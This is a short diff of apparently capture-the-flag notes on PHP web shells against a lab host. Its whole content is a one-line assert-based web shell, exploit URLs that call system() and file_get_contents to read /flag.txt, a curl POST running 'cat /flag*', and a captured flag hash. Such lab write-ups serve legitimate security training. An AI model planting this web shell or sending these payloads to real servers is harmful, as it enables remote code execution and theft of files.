@@ -41,8 +41,10 @@ assert(phpinfo())
 http://172.16.2.234:8011/3.php?1=system(%22cat%20/flag.txt%22)
 http://172.16.2.234:8011/3.php?1=print_r(file_get_contents(%22/flag.txt%22))
 ```
-<?php assert($_REQUEST[1]);?>
+
 ```
+<?php assert($_REQUEST[1]);?>
+
 curl "http://172.16.2.234:8011/4.php" -d "1=system('cat /flag*')"
 de9d4919ce86aeb38a5332c7d1c4d24a
 ```
